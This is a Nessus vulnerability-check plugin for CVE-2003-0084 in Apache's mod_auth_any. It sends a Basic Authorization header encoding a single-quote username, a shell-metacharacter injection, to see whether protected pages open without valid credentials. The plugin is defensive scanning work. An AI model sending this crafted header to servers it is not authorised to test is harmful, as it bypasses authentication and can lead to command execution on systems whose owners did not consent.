#
# (C) Tenable Network Security, Inc.
#

# Ref:
#
# From: Mario Sergio Fujikawa Ferreira <lioux@FreeBSD.org>
# Date: Mon, 24 Mar 2003 20:23:11 -0800 (PST)
# To: ports-committers@FreeBSD.org, cvs-ports@FreeBSD.org,
#         cvs-all@FreeBSD.org
# Subject: cvs commit: ports/www/mod_auth_any Makefile ports/www/mod_auth_any/files
#         bash_single_quote_escape_string.c patch-mod_auth_any.c


include("compat.inc");

if(description)
{
 script_id(11481);
 script_version("$Revision: 1.17 $");
 script_cve_id("CVE-2003-0084");
 script_bugtraq_id(7448);
 script_xref(name:"OSVDB", value:"13640");
 script_xref(name:"RHSA", value:"RHSA-2003:113-01");

 script_name(english:"mod_auth_any for Apache Metacharacter Remote Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code may be run on the remote host." );
 script_set_attribute(attribute:"description", value:
"The remote host seems to be running mod_auth_any, an Apache Module
which allows the use of third-party authentication programs.

This module does not properly escape shell characters when a
username is supplied, and therefore an attacker may use this module
to :
 - Execute arbitrary commands on the remote host
 - Bypass the authentication process completely" );
 script_set_attribute(attribute:"solution", value:
"Patch mod_auth_any or disable it." );
 script_set_attribute(attribute:"see_also", value:"http://www.freebsd.org/cgi/cvsweb.cgi/ports/www/mod_auth_any/files/" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 script_summary(english:"Attempts to log into the remote web server");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");
 script_dependencie("no404.nasl", "http_version.nasl", "webmirror.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/apache");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if ( report_paranoia < 2 )
{
 banner = get_http_banner(port:port);
 if ( ! banner || "Apache" >!< banner ) exit(0);
}

pages = get_kb_list(string("www/", port, "/content/auth_required"));
if(isnull(pages)) exit(0);
pages = make_list(pages);

foreach file (pages)
{
 r = http_send_recv3(port:port, method: "GET", item: file, username: "", password: "");
 if (isnull(r)) exit(0);
 before = strcat(r[0], r[1], '\r\n', r[2]);
 debug_print('1st req on port ', port, '\n', before, '\n');
 
 if (ereg(pattern:"^HTTP/[0-9]\.[0-9] 40[13] .*", string: r[0]))
 { 
  r = http_send_recv3(port:port, method: "GET", item: file, username: "", password: "", add_headers: make_array('Authorization', 'Basic Jzo='));
  if (isnull(r)) exit(0);
  if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 ", string: r[0]))
  {
   r2 = http_send_recv3(port:port, method: "GET", item: file, username: "", password: "", add_headers: make_array('Authorization', 'Basic YTpi'));
   if (isnull(r2)) exit(0);
   if ( r2[0] == r[0] ) # We got a 200 error code in both cases, make sure it's not a FP
   {
    if ( strlen(r2[2]) == 0 && strlen(r[2]) == 0 ) exit(0);
    if ( r2[2] == r[2] ) exit(0);
   }

    res = strcat(r[0], r[1], '\r\n', r[2]);
    debug_print('2nd req on port ', port, '\n', res, '\n');
   security_hole(port:port, extra:'A plain request for \'' + file + '\' gives the following output :\n' + before + '\n\nwhile a specially crafted request produces :\n' + res);
   exit(0);
  }
 }
}
